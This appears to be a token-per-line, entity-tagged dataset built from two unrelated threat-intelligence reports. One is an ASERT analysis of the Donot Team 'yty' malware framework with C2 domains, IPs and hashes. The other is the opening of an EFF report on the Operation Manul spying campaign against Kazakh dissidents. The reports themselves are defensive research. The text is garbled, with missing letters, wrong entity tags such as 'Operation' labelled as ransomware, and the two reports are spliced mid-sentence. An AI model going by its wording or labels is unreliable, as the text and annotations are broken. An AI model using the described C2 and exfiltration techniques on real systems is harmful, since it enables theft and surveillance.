indicates
,
downloads
and
executes
another
executable
,
then
removes
itself
.

The
downloader
attempts
to
retrieve
and
execute
the
following
 le
(
not
active
at
the
time
of
research
)
:
http://conf.serviceupdateres[.]com/Setup.exe  B_url.normal

This
host
is
a
direct
overlap
with
the
EHDevel B_malware.infosteal
malware
framework
as
it
was
also
seen
distributing
payloads
in
Bitdefender's
analysis
.

Setup.exe
(
Downloader
2
)
Analysis

SHA256
:
6bbd10ac20782542f40f78471c30c52f0619b91639840e60831dd665f9396365  B_hash

Compilation
Date
:
2018-01-04
09:43:28

PDB
Path
:
C:\Users\803\Desktop\ytyboth\yty
2.0\Release\Setup.pdb

Setup.exe
is
another
downloader
written
in
C++
but
contains
more
functionality
than
the
'
.exe
'
downloader
.

First
,
it
checks/creates
a
mutex
named
'
toptwo
'
so
that
only
one
copy
of
itself
is
running
on
the
victim
.

Evasion
Techniques

To
confuse
malware
analysts
,
it
mixes
in
junk
code
as
seen
in
Figure
5
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/junk_code/  B_url.normal
)

Figure
5
:
Junk
code
contained
in
binary
.

It
also
has
some
basic
anti-sandbox
detection
that
tries
to
detect
Virtual
PC
,

Sandboxie
,
and
VMware
(
example
in
Figure
6
)
:
(
https://www.arbornetworks.com/blog/asert/donotteam-leverages-new-modular-malware-frameworksouth-asia/anti_vm/ B_url.normal
)

Figure
6
:
VMWare
check
.

Debugging
Code

Similar
to
some
components
in
the
EHDevel B_malware.infosteal
framework
,
it
creates
logs
for
debugging
purposes
,
though
the
messages
are
not
as
verbose
as
in
EHDevel's B_malware.infosteal
samples
,
Figure
7
.

(
https://www.arbornetworks.com/blog/asert/donotteam-leverages-new-modular-malwareframework-south-asia/debug_log/ B_url.normal
)

Figure
7
:
Debugging
log

Command
&
Control

Much
like
EHDevel B_malware.infosteal
,
in
order
to
get
its
C2
host
,
it
downloads
a
 le
from
Google

Docs
.

The
document
in
this
case
was
located
at
:
https://drive.google[.]com/uc B_url.normal
?
authuser=0&id=1BUuYXU6bLdH_k_NWQIo7n5Uo_7LuZSu&export=download

At
the
time
of
research
,
the
name
of
the
document
was
'
ip2.txt
'
and
it
contained
the
following
IP
address
:
5.135.199[.]0

Per
its
metadata
,
the
owner
of
the
document
is
:

Alfred
Vil 
masterplan00007@gmail.com

An
example
C2
beacon
is
show
in
Figure
8
:
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/setup_phonehome/  B_url.normal
)

Figure
8
:
C2
beacon

Based
on
the
'
/football/goal
'
,
'
score
'
,
'
ball
'
,
and
'
loose
'
strings
they
are
using
a
football
theme
to
help
disguise
its
tra c
.

The
POST
data
contains
:

CPU
information

Windows
version

Is
a
virtual
machine
?

Computer
name

User
name

Serial
number
of
main
disk
volume

At
the
time
of
analysis
,
we
only
elicited
a
'
loose
'
response
from
the
C2
server
.

Continued
execution
is
reliant
on
eliciting
a
'
win
'
response
.
If
a
'
win
'
response
does
not
occur
,
the
malware
continues
beaconing
until
it
receives
the
appropriate
response
.

Once
the
correct
response
is
seen
,
the
malware
downloads
the
next
component
from
the
same
C2
using
the
following
URL
path
:
/football/download/2/boothelp

Persistence
Mechanism

A
secondary
macro
in
circular.xls
establishes
persistence
for
the
setup.exe
download
as
seen
in
Figure
9
.

(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/macro2/ B_url.normal
)

Figure
9
:
Persistence
mechanism

Unique
Strings

Setup.exe
introduces
three
common
names
seen
in
the
rest
of
the
malware
framework
:
'
yty
'
,
the
name
we
use
for
the
framework
,
from
the
PDB
path
string
.

'
bigdata
'
from
the
schtasks
/tn
(
taskname
)
parameter
used
in
the
persistence
mechanism
.

A
'
bot
id
'
consisting
of
computer
name
,
user
name
,
and
volume
serial
number
separated
by
dashes
.
boothelp.exe
–
Plugin
Downloader

SHA256
:
a2e9d9a00e7e75ab1d5e96dd327a89b55608a0319461f2866aadada5bd50e728  B_hash

Compilation
Date
:
2018-01-03
09:42:00

PDB
Path
:
C:\Users\803\Desktop\ytyboth\yty
2.0\Release\boothelp.pdb

Another
TTP
used
by
the
Donot
Team
is
the
transition
from
one
programming
language
to
another
.

We
see
this
with
boothelp.exe
,
which
is
written
in
.NET–
instead
of
C++
like
the
other
components
.
boothelp.exe
is
a
downloader
responsible
for
retrieving
modules/plugins
that
contain
added
functionality
.

The
plugin
downloader
uses
the
same
C2
channels
as
setup.exe
by
downloading
a
Google
Doc
 le
which
contains
the
C2
IP
address
.

It
then
continues
the
football
theme
by
beaconing
to
the
'
/football/ ag
'
folder
on
the
C2
server
,
Figure
10
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/boothelp_phonehome/ B_url.normal
)

Figure
10
:
C2
communications
to
retrieve
modules

Using
an
HTML
<div>
element
labeled
'
pcinfo'—possibly
displayed
verbatim
in
the
C2
panel—the
malware
beacon
message
contains
various
pieces
of
system
information
outlined
below
:

User
name

Computer
name

Windows
version

Number
of
processors

System
directory

Domain
name
.NET
version

Information
on
drives

CPU
information

The
response
from
the
C2
is
an
odd
string
containing
multiple
pieces
,
delimited
by
various
characters
,
but
boils
down
to
what
plugins
to
download/run
and
their
 le
sizes
.

The
plugins
for
this
framework
were
downloaded
from
the
same
URI
path
(
'
/football/download/2/
'
)
where
boothelp.exe
was
located
.

As
of
February
2018
,
we
observed
the
following
plugins
:
vstservice.exe
–
document
listing
plugin
abode.exe
–
 le
ex ltration
plugin
mdriver.exe
–
key
logger
plugin
dspcheck.exe
–
screenshot
plugin
mboard.exe
–
system
information
plugin

These
modules
share
functionality
with
components
of
the
EHDevel B_malware.infosteal
framework
,
creating
further
overlap
between
the
two
malware
frameworks
.

boothelp.exe
has
an
interesting
but
unused
function
that
takes
a
list
of
benign
URLs
and
opens
connections
to
them
.

As
noted
previously
,
we
believe
the
actors
are
still
testing
the
malware
framework
and
it's
possible
these
URLs
will
become
an
anti-analysis
feature
to
hide
C2
communication
among
benign
tra c
.

Some
of
the
interesting
benign
URLs
listed
below
:
https://www.google[.]co.in/ B_url.unknown
http://www.imdb[.]com/title/tt3501632/  B_url.unknown
https://www.rottentomatoes[.]com/m/thor_ragnarok_2017 B_url.unknown
vstservice.exe
–
File
Listing
Plugin

SHA256
:
e3fb0ab2f3d11f12c11b3ee1e1781eaec5581def820afe7e01902f31ba9e1936  B_hash

Compilation
Date
:
2018-01-03
08:14:32

PDB
Path
:
C:\Users\803\Desktop\ytyboth\yty
2.0\Release\vstservice.pdb

The
vstservice.exe
plugin
is
.NET
 le
responsible
for
sending
a
list
of
the
 le
system
to
the
C2
.

The
malware
retrieves
the
C2
from
a
Google
Docs
 le
like
the
previous
binaries
.

The
 le
was
located
at
the
following
location
:
https://docs.google[.]com/uc  B_url.normal
?
id=0B42CqDoBbigYM1lEamRDRjhFbGc&export=download

At
the
time
of
research
,
the
Google
Doc
was
named
'
domain.txt
'
and
contained
the
following
C2
host
:
upload.cloudsekurity[.]online

Per
its
metadata
,
it
is
owned
by
the
same
owner
as
the
document
above
.

The
plugin
sends
two
 le
listings
.

The
 rst
one
focuses
on
 les
with
the
following
extensions
:
docx
xlsx
pptx
docm
xlsm

The
second
one
contains
all
other
 les
.
An
example
is
shown
in
Figure
11
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/vts_exfil/  B_url.normal
)

Figure
11
:
C2
 le
list
name
ex ltration

The
URL
path
for
this
C2
references
the
'
bigdata
'
string
observed
in
the
macro
persistence
mechanism
.

Some
of
the
POST
parameters
are
unclear
,
but
contain
the
following
items
:
status
–
hardcoded
to
'
Found
'
path
–
hardcoded
to
'
Unknown
'
pc
–
bot
ID
type
–
unclear
fname
–
 le
name
cnumber
–
a
number
representative
of
large
 les
broken
into
chunks
orname
–
unclear
o d
–
order
ID
for
 les
broken
into
chunks

Similar
to
the
plugin
downloader
,
this
plugin
includes
an
unused
function
that
connects
to
benign
URLs
.

Some
of
the
URLs
are
listed
below
:
https://www.livechart[.]me/fall-2017/tv B_url.unknown
https://500px[.]com/editors B_url.unknown
https://paytm[.]com/metro-card-recharge B_url.unknown
abode.exe
–
File
Exfiltration
Plugin

SHA256
:
4d0114b1292714a13d43a4c0de3ea4498fa752354ad4f5b73a8ba441af6064ae  B_hash

Compilation
Date
:
2018-01-03
08:14:46

PDB
Path
:
C:\Users\803\Desktop\ytyboth\yty
2.0\Release\abode.pdb
abode.exe
is
a
.NET
 le
capable
of
 le
ex ltration
.

It
uses
the
same
Google
Doc
document
and
C2
as
the
vstservice.exe
plugin
.

Two
sets
of
 les
can
be
ex ltrated
.

The
 rst
set
is
a
periodic
sending
of
 les
generated
by
other
plugins
that
do
not
include
a
C2
mechanism
themselves
.

The
second
set
of
 les
is
speci ed
by
the
C2
as
seen
in
Figure
12
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/abode_poll/ B_url.normal
)

Figure
12
:
C2
response
specifying
 le
for
ex ltration

The
'
id
'
parameter
is
hardcoded
and
the
'
pc
'
parameter
is
the
bot
ID
.

The
 le
is
then
sent
to
the
C2
as
seen
in
Figure
13
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/abobe_file_send/  B_url.normal
)

Figure
13
:
File
ex ltration

This
plugin
also
includes
unused
,
benign
URLs
as
seen
below
:
https://www.gamespot[.]com/ B_url.unknown
https://www.rottentomatoes[.]com/tv/mr_robot/s03  B_url.unknown
mdriver.exe
–
Keylogger
Plugin

SHA256
:
600e7cfeea0ef8bd23cf95602a6b873898aa51848909aad1a7e8d4c5403797af  B_hash

Compilation
Date
:
2018-01-03
08:14:19

PDB
Path
:
C:\Users\803\Desktop\ytyboth\yty
2.0\Release\mdriver.pdb

This
plugin
is
written
in
C++
and
is
a
key
logger
.

It
checks/creates
a
mutex
named
'
twotwo
'
,
uses
the
Windows
SetWindowsHookEx
and
SetWinEventHook
APIs
to
perform
its
key
logging
,
and
then
relies
on
abobe.exe
to
ex ltrate
the
captured
key
strokes
.

Figure
14
shows
an
example
of
ex ltrated
key
log
data
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/keylogger/  B_url.normal
)

Figure
14
:
Key
log
ex ltration
dspcheck.exe
–
Screenshot
Plugin

SHA256
:
7d893d4f077e8e76a44a7830c5c3806dc956a6ef1a06c9f2dc33477c70f8cc9b  B_hash

Compilation
Date
:
2018-01-09
08:33:36

PDB
Path
:
D:\Soft\DevelopedCode\yty
2.0\Release\dspcheck.pdb
dspcheck.exe
is
a
screenshot
plugin
written
in
.NET
.

This
plugin
also
shows
evidence
that
the
actors
are
continuing
their
testing
e orts
as
seen
in
Figure
15
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/dsp_testing/  B_url.normal
)

Figure
15
:
Screenshot
code
shows
testing
evidence

It
has
the
beginnings
of
C2
functionality
,
but
this
sample
still
relies
on
abobe.exe
to
send
screenshots
back
to
the
C2
,
see
Figure
16
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/screenshot_exfil/ B_url.normal
)

Figure
16
:
Screenshot
ex ltration
mboard.exe
–
System
Information
Plugin

Packed
SHA256
:
50281cdd1b22f2b85de5809bf69ebd10e399410f519e357c1cb941c5dc7c95e1  B_hash

The
last
plugin
seen
in
this
framework
was
mboard.exe
.

It
is
written
in
Golang
and
is
packed
with
UPX
.

The
purpose
of
this
plugin
is
to
gather
various
system
information
such
as
the
following
:

Drive
information

Output
of
systeminfo
command

Installed
software

Output
of
ipcon g
/all
command

Output
of
net
view
command

Output
of
tasklist
command

The
collected
is
saved
into
multiple
 les
with
a
'
qr
'
extension
appended
.

They
are
then
sent
to
the
C2
via
abobe.exe
.
An
example
showing
the
running
process
list
being
sent
to
the
C2
is
shown
in
Figure
17
.
(
https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modularmalware-framework-south-asia/sysinfo_exfil/  B_url.normal
)

Figure
17
:
Running
process
list
ex ltration

Appendix
A
(
IOCs
)
:

SHA256
Hashes
9ce56e1403469fc74c8 61dde4e83ad72597c66ce07bbae12fa70183687b32d B_hash
8d7eb0b7251bc4a40ebc9142a59ed8af16fb11cf8168e76dca48a78d6d7e4595  B_hash
6bbd10ac20782542f40f78471c30c52f0619b91639840e60831dd665f9396365  B_hash
a2e9d9a00e7e75ab1d5e96dd327a89b55608a0319461f2866aadada5bd50e728  B_hash
e3fb0ab2f3d11f12c11b3ee1e1781eaec5581def820afe7e01902f31ba9e1936  B_hash
4d0114b1292714a13d43a4c0de3ea4498fa752354ad4f5b73a8ba441af6064ae  B_hash
600e7cfeea0ef8bd23cf95602a6b873898aa51848909aad1a7e8d4c5403797af  B_hash
7d893d4f077e8e76a44a7830c5c3806dc956a6ef1a06c9f2dc33477c70f8cc9b  B_hash
50281cdd1b22f2b85de5809bf69ebd10e399410f519e357c1cb941c5dc7c95e1  B_hash

C2
Domains
conf[.]serviceupdateres[.]com B_url.cncsvr
upload[.]cloudsekurity[.]online B_url.cncsvr
abodeupdater[.]com  B_url.cncsvr
qmails[.]org  B_url.cncsvr
serviceupports[.]com  B_url.cncsvr
thebangladeshtoday[.]net  B_url.cncsvr
sundayobserver[.]net  B_url.cncsvr

C2
IP
Addresses
5[.]135[.]199[.]0 B_ip.cncsvr
89[.]33[.]246[.]99  B_ip.cncsvr

Share

Share
20

Tweet
submit

Save
(
https://www.pinterest.com/pin/create/button/?guid=G6X66LGNvBBG2&url=https%3A%2F%2Fwww.arbornetworks.com%2Fblog%2Fasert%2Fdonot-team-leverages-new-modular-malware-frameworksouth-asia%2F&media=https%3A%2F%2Fwww.arbornetworks.com%2Fblog%2Fasert%2Fwpcontent%2Fuploads%2F2018%2F03%2Fdecoy_doc1.png&description=Donot%20Team%20Leverages%20New%20Modular%20Malware%20Framework%20in%20South%20Asia B_url.normal
)

Posted
in
advanced
persistent
threats
(
https://www.arbornetworks.com/blog/asert/category/advanced-persistentthreats/ B_url.unknown
)
,
analysis
(
https://www.arbornetworks.com/blog/asert/category/analysis/ B_url.unknown
)
,
Botnets
(
https://www.arbornetworks.com/blog/asert/category/botnets/  B_url.unknown
)
,
indicators
of
compromise
(
https://www.arbornetworks.com/blog/asert/category/indicatorsof-compromise/  B_url.unknown
)
,
Interesting
Research
(
https://www.arbornetworks.com/blog/asert/category/interesting-research/ B_url.unknown
)
,

Malware
(
https://www.arbornetworks.com/blog/asert/category/malware/  B_url.unknown
)
,

Reverse
Engineering
(
https://www.arbornetworks.com/blog/asert/category/reverse-engineering/  B_url.unknown
)
,
threat
analysis
(
https://www.arbornetworks.com/blog/asert/category/threatanalysis/ B_url.unknown
)
|

No
Comments
(
https://www.arbornetworks.com/blog/asert/donot-teamleverages-new-modular-malware-framework-south-asia/#respond  B_url.unknown
)

Your
email
address
will
not
be
published
.
Required
 elds
are
marked
*

Comment

Name
*

Email
*

Website
'
NETSCOUT
Arbor
Con rms
1.7
Tbps
DDoS

Attack;
The
Terabit
Attack
Era
Is
Upon
Us
(
https://www.arbornetworks.com/blog/asert/netscoutarbor-con rms-1-7-tbps-ddos-attack-terabitattack-era-upon-us/  B_url.normal
)

Arbor's
Security
Engineering
&
Response
Team
(
ASERT
)
delivers
world-class
network
security
research
and
analysis
for
the
bene t
of
today's
enterprise
and
network
operators
.

ASERT
engineers
and
researchers
are
part
of
an
elite
group
of
institutions
that
are
referred
to
as
'
super
remediators
'
and
represent
the
best
in
information
security
.

Show
more
'
End
of
Internet
'
(
https://www.arbornetworks.com/blog/asert/tag/end-of-internet/ B_url.normal
)
Analysis
(
https://www.arbornetworks.com/blog/asert/tag/analysis/  B_url.normal
)
Antiy
(
https://www.arbornetworks.com/blog/asert/tag/antiy/ B_url.normal
)
APT B_malware.backdoor
(
https://www.arbornetworks.com/blog/asert/tag/apt/ B_url.normal
)
Arbor
Networks
-
DDoS
Experts
(
https://www.arbornetworks.com/blog/asert/tag/arbor-networks-ddos-experts/ B_url.normal
)

Armageddon
(
https://www.arbornetworks.com/blog/asert/tag/armageddon/  B_url.normal
)
Banking
Trojans
(
https://www.arbornetworks.com/blog/asert/tag/banking-trojans/ B_url.normal
)
BGP
(
https://www.arbornetworks.com/blog/asert/tag/bgp/ B_url.normal
)
Bot
(
https://www.arbornetworks.com/blog/asert/tag/bot/ B_url.normal
)
Botnet
(
https://www.arbornetworks.com/blog/asert/tag/botnet/  B_url.normal
)
Botnets
(
https://www.arbornetworks.com/blog/asert/tag/botnets/ B_url.normal
)
Buhtrap
(
https://www.arbornetworks.com/blog/asert/tag/buhtrap/ B_url.normal
)
CAC
(
https://www.arbornetworks.com/blog/asert/tag/cac/ B_url.normal
)
China
(
https://www.arbornetworks.com/blog/asert/tag/china/ B_url.normal
)
Crypto
(
https://www.arbornetworks.com/blog/asert/tag/crypto/  B_url.normal
)
CSAC
(
https://www.arbornetworks.com/blog/asert/tag/csac/  B_url.normal
)

Danny
McPherson
(
https://www.arbornetworks.com/blog/asert/tag/danny-mcpherson/ B_url.normal
)
ddos
(
https://www.arbornetworks.com/blog/asert/tag/ddo  B_url.normal

Denial-of-service
attack
(
https://www.arbornetworks.com/blog/asert/tag/denial-of-service-attack/  B_url.normal
)
Dirt

Jumper
(
https://www.arbornetworks.com/blog/asert/tag/dirt-jumper/ B_url.normal
)
DNS
(
https://www.arbornetworks.com/blog/asert/tag/dns/ B_url.normal
)
down
(
https://www.arbornetworks.com/blog/asert/tag/down/  B_url.normal
)
Facebook
(
https://www.arbornetworks.com/blog/asert/tag/facebook/  B_url.normal
)
Financial
Sector
(
https://www.arbornetworks.com/blog/asert/tag/ nancial-sector/
)
Google
(
https://www.arbornetworks.com/blog/asert/tag/google/  B_url.normal
)
Halloween
(
https://www.arbornetworks.com/blog/asert/tag/halloween/ B_url.normal
)
hijack
(
https://www.arbornetworks.com/blog/asert/tag/hijack/  B_url.normal
)
internet
(
https://www.arbornetworks.com/blog/asert/tag/internet/  B_url.normal
)
Internet
Protocol
(
https://www.arbornetworks.com/blog/asert/tag/internet-protocol/ B_url.normal
)
Internet
service
provider
(
https://www.arbornetworks.com/blog/asert/tag/internetservice-provider/  B_url.normal
)
Internet
tra c
(
https://www.arbornetworks.com/blog/asert/tag/internet-tra c/  B_url.normal
)

IPv4
(
https://www.arbornetworks.com/blog/asert/tag/ipv4/  B_url.normal
)
IPv6
(
https://www.arbornetworks.com/blog/asert/tag/ipv6/  B_url.normal
)
Iran
(
https://www.arbornetworks.com/blog/asert/tag/iran/  B_url.normal
)
malware
(
https://www.arbornetworks.com/blog/asert/tag/malware-2/ B_url.normal
)
network
(
https://www.arbornetworks.com/blog/asert/tag/network/ B_url.normal
)
outage
(
https://www.arbornetworks.com/blog/asert/tag/outage/  B_url.normal
)
peering
(
https://www.arbornetworks.com/blog/asert/tag/peering/ B_url.normal
)
Russia
(
https://www.arbornetworks.com/blog/asert/tag/russia/  B_url.normal
)
Security
(
https://www.arbornetworks.com/blog/asert/tag/security/  B_url.normal
)
Streaming
media
(
https://www.arbornetworks.com/blog/asert/tag/streaming-media/ B_url.normal
)
tra c
(
https://www.arbornetworks.com/blog/asert/tag/tra c/ B_url.normal
)
Ukraine
(
https://www.arbornetworks.com/blog/asert/tag/ukraine/ B_url.normal
)
Wikileaks
(
https://www.arbornetworks.com/blog/asert/tag/wikileaks/ B_url.normal
)
YouTube
(
https://www.arbornetworks.com/blog/asert/tag/youtube/ B_url.normal
)
(
http://arbor.link/ntctwww B_url.normal
)
Website
(
http://arbor.link/ntctwww B_url.normal
)
|

Blog
(
http://arbor.link/ntctblog  B_url.normal
)
I
Got
a
Letter
From
the
Government
the
Other
Day
...

Unveiling
a
Campaign
of
Intimidation
,
Kidnapping
,
and
Malware
in
Kazakhstan

Eva
Galperin
,
International
Policy
Analyst
,
EFF

Cooper
Quintin
,
Staff
Technologist
,
EFF

Morgan
Marquis-Boire
,
Director
of
Security
,
First
Look
Media

Claudio
Guarnieri
,
Technologist
,
Amnesty
International

August
2016
-
Black
Hat
USA

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Table
of
Contents

Table
of
Contents

Abstract

Operation B_malware.ransom
Manul I

Victims
of
Operation B_malware.ransom
Manul I

JRat B_malware.backdoor
Malware
Family

JRat B_malware.backdoor
Functionality

Anti-Analysis

Bandook B_malware.unknown
Malware
Family

Core
Functionality

Network
Indicators
and
Modularity

Attribution

Observed
Links
to
the
Government
of
Kazakhstan

Observed
Links
to
Arcanum
Global
Intelligence

Observed
Links
To
Appin

Other
Possible
Targets

Conclusion

Acknowledgements

Appendix  B_hash
A I
:
Indicators
of
Compromise

C2
Servers I

Hashes

Appendix  B_url.normal
B I
:
Further
Reading

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Abstract

I
got
a
letter
from
the
government
the
other
day

Opened
it
and
read
it

It
said
they
were
suckers

Public
Enemy
,
Black
Steel
and
the
Hour
of
Chaos

This
report
covers
a
campaign
of
phishing
and
malware
which
we
have
named
'
Operation B_malware.ransom
Manul I
'
and
which
,
based
on
the
available
evidence
,
we
believe
is
likely
to
have
been
carried
out
on
behalf
of
the
government
of
Kazakhstan
against
journalists
,
dissidents
living
in
Europe
,
their
family
members
,
known
associates
,
and
their
lawyers
.

Many
of
the
targets
are
involved
in
litigation
with
the
government
of
Kazakhstan
in
European
and
American
courts
whose
substance
ranges
from
attempts
by
the
government
of
Kazakhstan
to
unmask
the
administrators
behind
an
anonymous
website
that
publishes
leaks
alleging
government
corruption
(
Kazaword
)
to
allegations
of
kidnapping
.

Our
research
suggests
links
between
this
campaign
and
other
campaigns
that
have
been
attributed
to
an
Indian
security
company
called
Appin
Security
Group
.

A
hired
actor
is
consistent
with
our
findings
on
the
Command
and
Control
servers
related
to
this
campaign
,
which
included
web-based
control
panels
for
multiple
RATs
,
suggesting
that
several
campaigns
were
being
run
at
once
.

A
hired
actor
may
also
explain
the
generic
and
uninspired
nature
of
the
phishing
,
which
often
took
the
form
of
an
email
purporting
to
contain
an
invoice
or
a
legal
document
with
an
attachment
containing
a
blurry
image
.

An
investigation
by
the
Swiss
federal
police
of
some
of
the
emails
linked
to
Operation B_malware.ransom
Manul I
concludes
that
they
were
sent
from
IP
addresses
in
India
,
which
also
suggests
a
link
to
Appin
.

Hundreds
of
leaked
emails
published
on
the
Kazaword
website
also
suggest
possible
links
between
this
campaign
and
Arcanum
Global
Intelligence
,
a
private
intelligence
company
with
headquarters
in
Zurich
,
which
was
allegedly
hired
by
the
government
of
Kazakhstan
to
perform
a
surveillance
and
data
extraction
Operation B_malware.ransom
against
a
high-profile
dissident
.

It
was
Respublika
'
s
Kazakhstan
to
request
an
injunction
in
a
New
York
court
to
bar
the
website
from
publishing
the
'
stolen
'
emails
.
reporting
on
these
connections
which
led
the
government
of
1
We
chose
the
name
Operation B_malware.ransom
Manul I
because
Manul
cat
is
native
to
the
steppes
of
Kazakhstan
,
and
that
this
campaign
seems
to
be
targeting
members
of
the
Kazakhstan
diaspora
and
their
associates
.

We
also
like
cats
.

2
https://kazaword.wordpress.com/ B_url.normal

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Operation B_malware.ransom
Manul I

In
2015
,
EFF
'
s
clients
in
the
Respublika
litigation
were
the
targets
of
several
spearphishing
attempts
they
had
received
via
email
(
Fig
.
1
)
.
We
analyzed
these
emails
and
discovered
that
they
contained
malware
,
which
appeared
to
be
coming
from
a
single
actor
as
part
of
an
ongoing
targeted
hacking
campaign
which
we
have
named
'
Operation B_malware.ransom
Manul I
.
'
Over
the
last
year
Operation B_malware.ransom
Manul I
has
repeatedly
targeted
our
clients
in
the
Respublika
case
(
Irina
Petrushova
and
Alexander
Petrushov
)
,
their
known
associates
and
family
members
,
and
other
dissidents
involved
in
litigation
with
the
government
of
Kazakhstan
in
Europeans
courts
,
as
well
as
their
family
members
,
associates
,
and
attorneys
.

We
were
also
able
to
observe
links
between
Operation B_malware.ransom
Manul I
and
a
malware
campaign
targeting
the
family
of
Mukhtar
Ablyazov
,
co-founder
of
the
Democratic
Choice
of
Kazakhstan
,
a
party
opposed
to
the
authoritarian
rule
of
Kazakhstan
'
s
President
Nursultan
Nazarbayev
.

Ablyazov
is
currently
fighting
extradition
from
France
,
where
he
lives
in
exile
,
to
Nazarbayev-allied
Russia
.

In
May
2013
,
Ablyazov
'
s
wife
,
Alma
Shalabaeva
,
and
6-year-old
daughter
,
Alua
Ablyazova
,
were
taken
into
custody
by
Italian
police
and
forcibly
deported
despite
having
legal
British
and
European
residence
permits
.

Within
72
hours
,
they
were
on
a
private
jet
hired
by
the
Kazakh
embassy
,
and
taken
to
Almaty
,
Kazakhstan
'
s
capital
.
Ablyazov
and
his
supporters
have
characterized
this
move
as
a
'
kidnapping
'
and
'
political
hostage-taking
'
ordered
by
President
Nazabayev
.

Spearphishing
emails
and
malware
sent
to
the
family
and
their
associates
during
this
period
may
have
been
intended
to
help
track
Alma
and
Alua
'
s
movements
in
preparation
for
this
incident
.
3
https://www.eff.org/cases/kazakhstan-v-does B_url.normal

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Fig
.
1
A
spearphishing
email
sent
to
Alexander
Petrushov
.

The
title
of
the
document
'
Atabayev
Invoice
'
may
refer
to
Bolat
Atabayev
,
a
Khazakh
dissident
and
theater
director
who
was
also
targeted
in
this
campaign
.

In
an
appeal
filed
with
a
Swiss
court
earlier
this
year
,
members
of
Ablyazov
'
s
family
allege
that
they
have
been
targeted
by
a
campaign
of
spearphishing
emails
containing
family
,
attorneys
,
and
malware
going
back
to
2012
.

The
campaign
against
Ablyazov's
associates
used
the
same
malware
as
we
found
in
Operation B_malware.ransom
Manul I
,
and
sometimes
used

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG
the
exact
same
emails
as
the
emails
sent
to
EFF
'
s
Respublika
clients
and
their
associates
,
on
the
same
dates
.

Additionally
,
analysis
by
GovCERT
of
other
spearphishing
emails
sent
to
Ablyazov
'
s
family
and
associates
in
2015
concludes
that
the
malware
uses
the
kaliex.net  B_url.unknown
domain
and
covertly
installs
Bandook B_malware.unknown
.

For
this
reason
we
believe
both
groups
are
targets
of
Operation B_malware.ransom
Manul I
.

Fig
2
.
The
PDF
document
from
the
spearphishing
email
entices
the
victim
to
download
a
fake
update
to
acrobat
.

Operation B_malware.ransom
Manul I
appears
to
primarily
use
two
different
commercially
available
malware
families
:
JRat B_malware.backdoor
and
Bandook B_malware.unknown
.

Victims
of
Operation B_malware.ransom
Manul I

Some
victims
of
Operation B_malware.ransom
Manul I
have
expressed
a
desire
to
preserve
their
anonymity
,
which
we
respect
.

The
victims
we
are
at
liberty
to
identify
include
Alexander
Petrushov
and
Irina
Petroshova
,
publishers
of
the
independent
Kazakh
newspaper
,
Respublika
,
Peter
Sahlas
,
a
human
rights
attorney
,
several
members
of
Mukhtar
Ablyazov
'
s
family
,
Astolfo

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Di
Amato
,
an
Italian
attorney
who
spearheaded
anti-corruption
litigation
involving
allegations
of
corruption
by
Kazakhstan
,
and
dissident
theater
director
Bolat
Atabayev
.

Several
victims
allege
that
they
have
been
physically
followed
,
had
their
homes
broken
into
,
and
been
tracked
using
GPS
devices
.
Mr
.
Di
Amato
alleges
that
his
law
firm
'
s
website
has
been
the
victim
of
several
DDoS
attacks
,
which
he
believes
are
linked
to
his
litigation
involving
the
government
of
Kazakhstan
.

JRat B_malware.backdoor
Malware
Family

One
of
the
common
malware
samples
used
over
the
course
of
Operation B_malware.ransom
Manul I
is
known
as
JRat B_malware.backdoor
or
Jacksbot
.

JRat B_malware.backdoor
is
a
commercially
available
remote
access
tool
(
RAT B_malware.unknown
)
,
written
in
Java
.

JRat B_malware.backdoor
is
currently
available
for
purchase
at
jrat[.]io B_url.normal
for
the
price
of
$40
USD
.

JRat B_malware.backdoor
has
been
continuously
developed
for
the
last
four
years
,
seemingly
by
a
single
developer
who
goes
by
the
name
'
redp0ison
'
.

While
JRat B_malware.backdoor
itself
is
closed
source
,
many
modules
and
helpful
utilities
are
open
source
and
are
available
on
github
.
5

JRat B_malware.backdoor
Functionality

Fig
3
.
JRat B_malware.backdoor
Controller
on
Windows
4
Payable
only
in
bitcoin
.
5
https://github.com/java-rat B_url.normal

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

JRat B_malware.backdoor
is
a
cross
platform
RAT
,
able
to
target
hosts
running
Windows
,
OSX
,
Linux
,
BSD
,
and
even
Solaris
.

The
RAT B_malware.unknown
is
highly
modular—it
even
has
an
open
API
so
that
the
attacker
may
write
custom
modules
to
fit
their
needs
.

JRat B_malware.backdoor
modules
include
the
following
functionality
:
keylogging
,
reverse
proxy
,
password
recovery
,
turning
on
the
host
webcam
,
disabling
webcam
indicator
light
,
listing
host
processes
,
opening
a
shell
on
the
host
,
editing
the
host
registry
,
and
even
chatting
with
the
remote
host
.

JRat B_malware.backdoor
also
provides
a
controller
application
,
which
is
written
in
Java
.

This
controller
application
allows
the
attacker
to
manage
all
of
their
JRat B_malware.backdoor
instances
and
view
uptime
,
operating
system
,
and
other
information
about
all
infected
hosts
.

JRat B_malware.backdoor
also
provides
a
web
version
of
the
controller
,
which
is
open
source
.
6

Fig
4

JRat B_malware.backdoor
Controller
viewing
host
screen

Fig
5
.
JRat B_malware.backdoor
Controller
screen
for
an
infected
host

6
https://github.com/java-rat/web B_url.normal

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Anti-Analysis

JRat B_malware.backdoor
contains
a
number
of
interesting
features
to
